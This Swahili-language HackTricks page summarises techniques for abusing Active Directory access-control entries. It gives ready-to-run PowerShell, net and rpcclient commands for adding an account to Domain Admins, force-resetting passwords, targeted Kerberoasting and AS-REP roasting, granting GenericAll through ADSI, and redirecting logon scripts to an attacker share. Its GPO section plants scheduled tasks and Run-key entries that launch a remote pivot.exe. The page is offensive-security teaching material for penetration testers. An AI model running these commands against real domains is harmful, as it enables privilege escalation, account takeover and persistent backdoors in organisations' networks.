# Abusing Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ukurasa huu ni muhtasari wa mbinu kutoka** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **na** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Kwa maelezo zaidi, angalia makala asili.**

## **GenericAll Rights on User**

Haki hii inampa mshambuliaji udhibiti kamili juu ya akaunti ya mtumiaji wa lengo. Mara haki za `GenericAll` zinapothibitishwa kwa kutumia amri `Get-ObjectAcl`, mshambuliaji anaweza:

- **Kubadilisha Nywila ya Lengo**: Kwa kutumia `net user <username> <password> /domain`, mshambuliaji anaweza kurekebisha nywila ya mtumiaji.
- **Kerberoasting ya Lengo**: Weka SPN kwenye akaunti ya mtumiaji ili kuifanya iweze kerberoastable, kisha tumia Rubeus na targetedKerberoast.py kutoa na kujaribu kuvunja hash za tiketi ya kutoa tiketi (TGT).
```powershell
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Zima awali ya uthibitisho kwa mtumiaji, ikifanya akaunti yao kuwa hatarini kwa ASREPRoasting.
```powershell
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll Rights on Group**

Haki hii inaruhusu mshambuliaji kubadilisha uanachama wa kikundi ikiwa wana haki za `GenericAll` kwenye kikundi kama `Domain Admins`. Baada ya kubaini jina la kipekee la kikundi kwa kutumia `Get-NetGroup`, mshambuliaji anaweza:

- **Kujiongeza kwenye Kikundi cha Domain Admins**: Hii inaweza kufanywa kupitia amri za moja kwa moja au kutumia moduli kama Active Directory au PowerSploit.
```powershell
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## **GenericAll / GenericWrite / Write on Computer/User**

Kuwa na haki hizi kwenye kituo cha kompyuta au akaunti ya mtumiaji kunaruhusu:

- **Kerberos Resource-based Constrained Delegation**: Inaruhusu kuchukua udhibiti wa kituo cha kompyuta.
- **Shadow Credentials**: Tumia mbinu hii kuiga kompyuta au akaunti ya mtumiaji kwa kutumia haki za kuunda shadow credentials.

## **WriteProperty on Group**

Ikiwa mtumiaji ana haki za `WriteProperty` kwenye vitu vyote kwa kundi maalum (mfano, `Domain Admins`), wanaweza:

- **Kujiongeza Kwenye Kundi la Domain Admins**: Inaweza kufanywa kwa kuunganisha amri za `net user` na `Add-NetGroupUser`, mbinu hii inaruhusu kupandishwa vyeo ndani ya eneo.
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Haki hii inawawezesha washambuliaji kujiongeza kwenye vikundi maalum, kama `Domain Admins`, kupitia amri zinazoshughulikia uanachama wa kundi moja kwa moja. Kutumia mfuatano wa amri zifuatazo kunaruhusu kujiongeza mwenyewe:
```powershell
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Haki inayofanana, hii inawawezesha washambuliaji kujiongeza moja kwa moja kwenye vikundi kwa kubadilisha mali za kikundi ikiwa wana haki ya `WriteProperty` kwenye vikundi hivyo. Uthibitisho na utekelezaji wa haki hii hufanywa kwa:
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Kuwa na `ExtendedRight` kwa mtumiaji kwa `User-Force-Change-Password` kunaruhusu mabadiliko ya nywila bila kujua nywila ya sasa. Uthibitishaji wa haki hii na matumizi yake yanaweza kufanywa kupitia PowerShell au zana nyingine za mistari ya amri, zikitoa mbinu kadhaa za kubadilisha nywila ya mtumiaji, ikiwa ni pamoja na vikao vya mwingiliano na mistari moja kwa mazingira yasiyo ya mwingiliano. Amri zinatofautiana kutoka kwa matumizi rahisi ya PowerShell hadi kutumia `rpcclient` kwenye Linux, ikionyesha ufanisi wa njia za shambulio.
```powershell
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner kwenye Kundi**

Ikiwa mshambuliaji atagundua kuwa ana haki za `WriteOwner` juu ya kundi, anaweza kubadilisha umiliki wa kundi hilo kuwa wake. Hii ina athari kubwa hasa wakati kundi lililo katika swali ni `Domain Admins`, kwani kubadilisha umiliki kunaruhusu udhibiti mpana juu ya sifa za kundi na uanachama. Mchakato unahusisha kubaini kitu sahihi kupitia `Get-ObjectAcl` na kisha kutumia `Set-DomainObjectOwner` kubadilisha mmiliki, ama kwa SID au jina.
```powershell
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite kwenye Mtumiaji**

Ruhusa hii inamruhusu mshambuliaji kubadilisha mali za mtumiaji. Kwa hakika, kwa ufikiaji wa `GenericWrite`, mshambuliaji anaweza kubadilisha njia ya skripti ya kuingia ya mtumiaji ili kutekeleza skripti mbaya wakati wa kuingia kwa mtumiaji. Hii inafikiwa kwa kutumia amri ya `Set-ADObject` kuboresha mali ya `scriptpath` ya mtumiaji anaye target ili kuelekeza kwenye skripti ya mshambuliaji.
```powershell
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite kwenye Kundi**

Kwa ruhusa hii, washambuliaji wanaweza kubadilisha uanachama wa kundi, kama kuongeza wenyewe au watumiaji wengine kwenye makundi maalum. Mchakato huu unahusisha kuunda kitu cha akidi, kukitumia kuongeza au kuondoa watumiaji kutoka kundi, na kuthibitisha mabadiliko ya uanachama kwa amri za PowerShell.
```powershell
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Kuwa na kitu cha AD na kuwa na ruhusa za `WriteDACL` juu yake inamuwezesha mshambuliaji kujipatia ruhusa za `GenericAll` juu ya kitu hicho. Hii inafanywa kupitia udanganyifu wa ADSI, ikiruhusu udhibiti kamili juu ya kitu hicho na uwezo wa kubadilisha uanachama wake wa kikundi. Licha ya hili, kuna mipaka wakati wa kujaribu kutumia ruhusa hizi kwa kutumia cmdlets za moduli ya Active Directory `Set-Acl` / `Get-Acl`.
```powershell
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replication on the Domain (DCSync)**

Shambulio la DCSync linatumia ruhusa maalum za kuiga kwenye eneo ili kuiga Kituo cha Kikoa na kusawazisha data, ikiwa ni pamoja na akidi za watumiaji. Mbinu hii yenye nguvu inahitaji ruhusa kama `DS-Replication-Get-Changes`, ikiruhusu washambuliaji kutoa taarifa nyeti kutoka kwenye mazingira ya AD bila ufikiaji wa moja kwa moja kwa Kituo cha Kikoa. [**Jifunze zaidi kuhusu shambulio la DCSync hapa.**](../dcsync.md)

## GPO Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Delegation

Ruhusa iliyotolewa ya kusimamia Vitu vya Sera za Kundi (GPOs) inaweza kuleta hatari kubwa za usalama. Kwa mfano, ikiwa mtumiaji kama `offense\spotless` amepewa haki za usimamizi wa GPO, wanaweza kuwa na ruhusa kama **WriteProperty**, **WriteDacl**, na **WriteOwner**. Ruhusa hizi zinaweza kutumika vibaya kwa madhumuni mabaya, kama ilivyobainishwa kwa kutumia PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumerate GPO Permissions

Ili kubaini GPO zilizo na mipangilio isiyo sahihi, cmdlets za PowerSploit zinaweza kuunganishwa pamoja. Hii inaruhusu kugundua GPO ambazo mtumiaji maalum ana ruhusa za kusimamia: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Kompyuta zenye Sera Iliyotumika**: Inawezekana kubaini ni kompyuta zipi GPO maalum inatumika, kusaidia kuelewa upeo wa athari zinazoweza kutokea. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Sera Zilizotumika kwa Kompyuta Maalum**: Ili kuona ni sera zipi zimewekwa kwa kompyuta fulani, amri kama `Get-DomainGPO` zinaweza kutumika.

**OUs zenye Sera Iliyotumika**: Kubaini vitengo vya shirika (OUs) vilivyoathiriwa na sera fulani kunaweza kufanywa kwa kutumia `Get-DomainOU`.

### Abuse GPO - New-GPOImmediateTask

GPO zilizo na mipangilio isiyo sahihi zinaweza kutumika vibaya kutekeleza msimbo, kwa mfano, kwa kuunda kazi ya ratiba ya papo hapo. Hii inaweza kufanywa kuongeza mtumiaji kwenye kundi la wasimamizi wa ndani kwenye mashine zilizoathiriwa, ikiongeza sana ruhusa:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Moduli ya GroupPolicy, ikiwa imewekwa, inaruhusu uundaji na kuunganisha GPO mpya, na kuweka mapendeleo kama vile thamani za rejista kutekeleza backdoors kwenye kompyuta zilizoathirika. Njia hii inahitaji GPO kusasishwa na mtumiaji kuingia kwenye kompyuta kwa ajili ya utekelezaji:
```powershell
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse inatoa njia ya kutumia GPO zilizopo kwa kuongeza kazi au kubadilisha mipangilio bila haja ya kuunda GPO mpya. Chombo hiki kinahitaji kubadilisha GPO zilizopo au kutumia zana za RSAT kuunda mpya kabla ya kutekeleza mabadiliko:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO updates kawaida hufanyika kila dakika 90. Ili kuharakisha mchakato huu, hasa baada ya kutekeleza mabadiliko, amri ya `gpupdate /force` inaweza kutumika kwenye kompyuta lengwa ili kulazimisha sasisho la sera mara moja. Amri hii inahakikisha kwamba mabadiliko yoyote kwenye GPOs yanatumika bila kusubiri mzunguko wa sasisho la moja kwa moja unaofuata.

### Under the Hood

Wakati wa ukaguzi wa Kazi za Ratiba kwa GPO fulani, kama vile `Misconfigured Policy`, kuongeza kazi kama `evilTask` kunaweza kuthibitishwa. Kazi hizi zinaundwa kupitia skripti au zana za amri zikiwa na lengo la kubadilisha tabia ya mfumo au kuongeza mamlaka.

Muundo wa kazi, kama inavyoonyeshwa katika faili ya usanifu wa XML iliyozalishwa na `New-GPOImmediateTask`, inaelezea maelezo ya kazi iliyopangwa - ikiwa ni pamoja na amri itakayotekelezwa na vichocheo vyake. Faili hii inawakilisha jinsi kazi zilizopangwa zinavyofafanuliwa na kusimamiwa ndani ya GPOs, ikitoa njia ya kutekeleza amri au skripti za kiholela kama sehemu ya utekelezaji wa sera.

### Users and Groups

GPOs pia zinaruhusu kubadilisha uanachama wa watumiaji na vikundi kwenye mifumo lengwa. Kwa kuhariri faili za sera za Watumiaji na Vikundi moja kwa moja, washambuliaji wanaweza kuongeza watumiaji kwenye vikundi vyenye mamlaka, kama vile kundi la `administrators` la ndani. Hii inawezekana kupitia ugawaji wa ruhusa za usimamizi wa GPO, ambayo inaruhusu kubadilisha faili za sera ili kujumuisha watumiaji wapya au kubadilisha uanachama wa vikundi.

Faili ya usanifu wa XML kwa Watumiaji na Vikundi inaelezea jinsi mabadiliko haya yanavyotekelezwa. Kwa kuongeza entries kwenye faili hii, watumiaji maalum wanaweza kupewa mamlaka ya juu kwenye mifumo iliyoathiriwa. Njia hii inatoa njia ya moja kwa moja ya kuongeza mamlaka kupitia kubadilisha GPO.

Zaidi ya hayo, mbinu za ziada za kutekeleza msimbo au kudumisha kudumu, kama vile kutumia skripti za kuingia/kuondoka, kubadilisha funguo za rejista kwa ajili ya kuanzisha kiotomatiki, kufunga programu kupitia faili za .msi, au kuhariri usanifu wa huduma, zinaweza pia kuzingatiwa. Mbinu hizi zinatoa njia mbalimbali za kudumisha ufikiaji na kudhibiti mifumo lengwa kupitia matumizi mabaya ya GPOs.

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
